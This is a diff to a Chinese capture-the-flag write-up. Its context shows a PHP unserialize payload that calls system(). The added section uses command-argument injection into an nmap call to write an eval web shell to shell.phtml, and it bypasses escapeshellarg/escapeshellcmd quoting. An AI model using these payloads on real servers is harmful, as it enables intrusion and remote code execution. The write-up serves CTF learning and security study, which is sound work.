@@ -82,3 +82,49 @@
 <figure><img src=".gitbook/assets/phpweb-4.png" alt=""><figcaption></figcaption></figure>
 
 排除开系统文件可以发现 `/tmp/flagoefiu4r93` 文件，通过构造 payload `func=unserialize&p=O:4:"Test":2:{s:1:"p";s:22:"cat /tmp/flagoefiu4r93";s:4:"func";s:6:"system";}` 就得到 flag 了。
+
+### Nmap
+
+先随便输入 `127.0.0.1` 可以得到回显并且发现 Param `f=6f859` 。
+
+构造 Payload 如下
+
+```
+f=6f858
+```
+
+可以得到报错回显如下
+
+```
+Warning: simplexml_load_file(): I/O warning : failed to load external entity "xml/6f858" in /var/www/html/result.php on line 23
+```
+
+可以推断出是 xml 输出的，假设当前表达式为
+
+```php
+<?php system('nmap '. $_POST['host'] .' -oX')
+```
+
+可以通过 `-oG` 输出到文件中，构造 Payload 如下
+
+```
+host=<?=eval($_POST[1]);?> -oG shell.php
+```
+
+回显 `Hacker...` ，说明存在一定的过滤，试试改成 `phtml` 。
+
+构造 Payload 如下
+
+```
+host=<?=eval($_POST[1]);?> -oG shell.phtml
+```
+
+回显 `Host maybe down` ，说明传入成功，但是并不能访问 `shell.phtml` ，通过查看源代码才发现还需要进行单引号的绕过（存在 `escapeshellarg()` 和 `escapeshellcmd()` ），因此需要修改 Payload 如下
+
+```
+host='<?=eval($_POST[1]);?> -oG shell.phtml '
+```
+
+结尾的空格是为了防止 `escapeshellcmd()` 函数使得文件名变成 `shell.phtml\\` 。
+
+通过蚁剑一把梭就可以得到 flag 了。
